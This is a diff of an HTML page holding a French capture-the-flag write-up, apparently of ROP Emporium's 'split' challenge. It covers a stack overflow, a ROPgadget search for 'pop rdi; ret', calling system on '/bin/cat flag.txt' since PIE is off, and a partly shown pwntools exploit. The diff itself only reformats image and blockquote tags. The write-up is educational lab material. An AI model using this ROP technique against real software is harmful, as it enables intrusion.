@@ -186,7 +186,7 @@
 </span></span></code></pre></div><p>Cette fois-ci, <strong>NX</strong> est activé, ce qui veut dire qu&rsquo;on ne pourra pas utiliser de shellcode.</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>On va run l&rsquo;executable et voir ce qu&rsquo;il se passe</p>
-<p><img alt="2023-01-14-140834_657x666_scrot" src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png" alt="2023-01-14-140834_657x666_scrot"></p>
 <p>Contrairement au précédent, il ne nous donne aucune information sur son fonctionnement. En revanche, on voit que si on entre un nombre de bytes élevé dans l&rsquo;input, il  <code>segfault</code>, ce qui veut dire qu&rsquo;on a commencé à réecrire la sauvegarde de <code>rip</code></p>
 <p>C&rsquo;est bon signe, on a déjà trouvé notre point d&rsquo;entrée. On va maintenant désassembler l&rsquo;executable avec <code>pwndbg</code> pour essayer de comprendre plus en détail ce qu&rsquo;il fait</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
@@ -402,8 +402,7 @@
 </span></span></code></pre></div><p>Parfait, c&rsquo;est bien l&rsquo;adresse de notre <code>/bin/cat flag.txt</code>.</p>
 <p>Il nous manque à présent une dernière chose: un gadget <code>pop rdi; ret</code>.</p>
 <blockquote>
-<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va être appelée, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p>
-</blockquote>
+<p>Dans les architectures x64, les arguments des fonctions passent par des <strong>registres</strong>. Par exemple, quand la fonction <code>system</code> va être appelée, elle va aller chercher son premier argument dans le registre <code>rdi</code>.</p></blockquote>
 <p>Pour trouver ce gadget, on peut utiliser <code>ROPGadget</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary split <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007c3</span> : pop rdi ; ret
@@ -414,8 +413,7 @@
 <li>On peut appeller la fonction <code>system</code> depuis son adresse puisque la protection <code>PIE</code> n&rsquo;est pas activée</li>
 </ul>
 <blockquote>
-<p>Si PIE avait été activé, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait changé entre chaque exécution</p>
-</blockquote>
+<p>Si PIE avait été activé, nous n&rsquo;aurions pas pu prendre l&rsquo;adresse de la fonction <code>system</code> puisqu&rsquo;elle aurait changé entre chaque exécution</p></blockquote>
 <h2 id="final-payload">Final Payload</h2>
 <p>Complétons notre exploit</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -437,7 +435,7 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Et maintenant, on le lance:</p>
-<p><img alt="2023-01-14-155456_1115x137_scrot" src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212481792-479ec049-ac21-4fc7-b527-da64381c21ef.png" alt="2023-01-14-155456_1115x137_scrot"></p>
 <p>On a notre flag, gg !</p>
 
       </div>
